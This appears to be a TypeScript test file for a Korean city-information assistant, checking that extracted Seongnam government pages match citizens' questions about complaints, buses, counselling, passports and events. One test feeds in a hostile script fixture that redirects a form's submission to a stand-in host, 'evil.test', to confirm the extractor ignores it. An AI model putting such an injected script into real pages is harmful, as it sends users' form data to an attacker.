import assert from "node:assert/strict";
import test from "node:test";
import { readFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { extractOfficialDocument } from "./extract-official-document";
import { answersRequestedDetail, matchesRequestedSubject, relevantNavigation, relevantOriginalSection } from "./official-navigation";
import { createExpandedPublicInformationResponse } from "./expanded-public-information";
import { readSearchAnswer } from "./read-search-answer";
import { isJourneyRequest, questionScope } from "./question-scope";

const dir="tests/fixtures/voicecare/submission-sources";
function original(url:string) {
  const file=createHash("sha256").update(url).digest("hex");
  return {...JSON.parse(readFileSync(`${dir}/${file}.json`,"utf8")),...extractOfficialDocument(readFileSync(`${dir}/${file}.html`,"utf8"),url)};
}
test("published civil catalog handler reaches the actual complaint starting page",()=>{
  const catalog=original("https://www.seongnam.go.kr/pm02020101");
  assert.ok(catalog.navigation.some((l:{url:string})=>l.url==="https://www.seongnam.go.kr/pm02020101/40"));
  const page=original("https://www.seongnam.go.kr/pm02020101/40");
  assert.ok(page.sections.some((s:string)=>answersRequestedDetail(s,"성남시청에 민원 넣고 싶은데 어디서 시작해요")));
  assert.match(page.sections.join(" "),/정부통합인증.*국민신문고/);
  const malicious=extractOfficialDocument('<a onclick="fn_move_form(40)">민원</a><script>form.action="https://evil.test/"+cvlcptBizSn;</script>');
  assert.deepEqual(malicious.navigation,[]);
});
test("actual sitemap's 자동차 parent leads to the bus source; unrelated events stay excluded",()=>{
  const page=original("https://www.seongnam.go.kr/sitemap");
  assert.ok(relevantNavigation(page,"성남에서 버스 타려면").some(l=>l.url==="https://www.seongnam.go.kr/tr-cn010201"));
  const bus=original("https://www.seongnam.go.kr/tr-cn010201");
  assert.match(bus.sections.join(" "),/경기버스정보.*경로검색.*실시간/);
  assert.equal(answersRequestedDetail("채용박람회 버스 이용 안내입니다.","성남에서 버스 타려면"),false);
});
test("free aids cannot establish free counselling, even when both words occur",()=>{
  const page=original("https://www.seongnam.go.kr/health/ht-pm020101/9016");
  assert.equal(answersRequestedDetail(page.sections.join(" "),"담배 끊고 싶은데 무료 상담 있어요"),false);
  assert.equal(answersRequestedDetail("금연클리닉 금연상담 서비스 비용: 무료. 금연을 희망하는 시민 대상입니다.","금연상담 비용"),true);
  assert.equal(answersRequestedDetail("금연클리닉 금연상담을 제공합니다. 금연보조제는 무료입니다.","금연 상담 비용"),false);
});
test("free career counselling is not even a relevant link for smoking cessation",()=>{
  const page=original("https://job.seongnam.go.kr/contents/content.do?cIdx=135&fboard=board_jobfair2");
  assert.equal(matchesRequestedSubject([page.title,...page.sections].join(" "),"담배 끊고 싶은데 무료 상담 있어요"),false);
});
for(const query of ["판교역에서 성남시청 가는 대중교통 알려줘","야탑역에서 시청까지 버스 경로 알려줘"])test(`journey limitation never spends a model call: ${query}`,async()=>{
  const result=await createExpandedPublicInformationResponse({query},{search:async()=>assert.fail("no route API")});
  const body=readSearchAnswer(result.body);assert.equal(body?.kind,"unsupported");
  assert.match(body!.answer.plainLanguageSummary,/실시간/);assert.equal(body!.answer.sources.length,0);
  assert.ok(questionScope(query)?.links[0].url.endsWith("tr-cn010201"));
});
test("journey guard preserves eligibility and accessible vehicle questions",()=>{
  for(const q of ["성남에서 장애인 버스요금 지원 신청하는 곳까지 가야 해","휠체어 타고 집에서 병원까지 가는 차량 지원","시청 버스 안내"])assert.equal(isJourneyRequest(q),false);
});

test("fresh production passport certificate table cannot answer passport issuance",()=>{
  const page=original("https://www.seongnam.go.kr/cn020403");
  assert.equal(relevantOriginalSection(page,"성남시 여권 어디서 만들어"),undefined);
  assert.equal(matchesRequestedSubject([page.title,...page.sections].join(" "),"성남시 여권 어디서 만들어"),false);
  assert.equal(answersRequestedDetail(page.sections[0],"여권발급기록증명서 수수료"),true);
  assert.equal(answersRequestedDetail("여권사무 안내 여권 신청 장소: 성남시청 1층 종합민원실", "성남시 여권 어디서 만들어"),true);
});
test("ended performance is rejected for discovery, but historical requests remain possible",()=>{
  const page=original("https://www.seongnam.go.kr/tour/tu-pm020101/6014");
  const text=[page.title,...page.sections].join(" ");
  assert.equal(matchesRequestedSubject(text,"시에서 하는 무료 공연 어디서 찾아요","2026-09-07"),false);
  assert.equal(matchesRequestedSubject(text,"지난 2026년 공연 기록","2026-09-07"),true);
  assert.equal(matchesRequestedSubject(text,"무료 공연","2026-08-16"),true);
  assert.equal(matchesRequestedSubject(text,"무료 공연","2026-08-17"),false);
});
test("passport place question cannot stop at general eligibility or a documents list",()=>{
  const query="성남시 여권 어디서 만들어";
  assert.equal(answersRequestedDetail("여권발급 대상 대한민국 국적을 보유하고 여권법령에 의한 여권발급 거부 또는 제한 대상이 아닌 자",query),false);
  assert.equal(answersRequestedDetail("일반여권신청 공통서류 여권발급신청서 1부 여권민원실 비치 신분증 사진 2매 종합민원실 내에는 사진관이 없습니다",query),false);
  assert.equal(answersRequestedDetail("여권 신청 접수 장소: 성남시청 1층 종합민원실",query),true);
});
test("another organizer's performance cannot replace the requested foundation site",()=>{
  const page=original("https://www.seongnam.go.kr/pm010201/6228");
  const text=[page.title,...page.sections].join(" ");
  assert.equal(matchesRequestedSubject(text,"성남문화재단 공연표 신청하는데 공식 사이트 알려줘"),false);
  assert.equal(matchesRequestedSubject(text,"무료 공연","2026-09-07"),true);
  assert.equal(matchesRequestedSubject("성남문화재단", "성남문화재단 공연표 공식 사이트"),true);
});
